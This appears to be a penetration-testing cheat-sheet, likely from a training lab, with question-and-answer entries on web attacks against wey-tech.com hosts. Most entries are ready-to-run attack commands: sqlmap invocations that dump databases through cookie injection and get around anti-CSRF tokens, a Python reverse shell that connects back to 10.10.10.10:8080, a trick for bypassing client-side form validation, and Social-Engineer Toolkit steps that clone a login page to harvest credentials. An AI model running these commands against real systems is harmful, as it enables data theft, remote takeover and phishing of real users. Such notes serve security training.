# Various Web Exploits

### Give an example of a sqlmap query to exploit SQLi on cookies:
```
sqlmap -u http://shop.wey-tech.com/account_api.php --cookie="session=c2deb0aa8a22efd8c8f74c3db021d6e9" --data='accountinfo=accountinfo' --threads 2 -p "cookie" --ignore-code 401 --level 5 --risk 3 --dbms=mysql -a
```
`a` will retrieve everything. If you don't want to do that and instead find the information incrementally to save time for what you're really after then use: `--dbs` to enumerate teh databases, then `--tables -D <db name>` to get the tables, then `-T users --dump` to dump the *users* tables for example.

### You have a gzip compressed data file and want to peep inside?
Try `zless` or `zcat`.

### What is a python payload for a reverse shell?
```
import os; os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.10.10/8080 0>&1\"'
```

### In what way can you try to trip up a web form that uses html tags in order to check syntax?
As an example case with `<input ... type='email'>`, you can inspect the tag and change the type to `text` and try submitting a single quote (`'`).

### How do you use sqlmap when the site has an anti-CSRF token mechanism?
```
sqlmap -u "http://personnel.wey-tech.com/application-check.php?applicantmail=blah&token=M" --csrf-url="http://personnel.wey-tech.com/validator.php" --csrf-token=token -v 6
```
If that doesn't work, you may need to use `eval` to write a custom python script.
```
sqlmap -u "http://personnel.wey-tech.com/application-check.php?applicantmail=blah&token=M" --eval "import urllib;page = urllib.urlopen('http://personnel.wey-tech.com/validator.php');token = urllib.quote(str(page.read()).decode('utf-8'));print(token)" -p applicantmail -v 1
```

### What tool helps detect web server versions and misconfigurations?
```
nikto -h http://mail.wey-tech.com
```
Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. 

### What is a tool for social engineering?
```
sudo setoolkit
```
Use the following options for SET: 1) Social-Engineering Attacks , 2) Website Attack Vectors, 3) Credential Harvester Attack Method, 2) Site Cloner

Clone the login page http://join.wey-tech.com/wp-login.php

This will set up and clone the login page for join.wey-tech.com.

Note - Be sure you visit your local tun0 interface at http://10.2.4.2/ to ensure it's cloning the login page and not index. If so, close setoolkit and try again until it clones the login page.
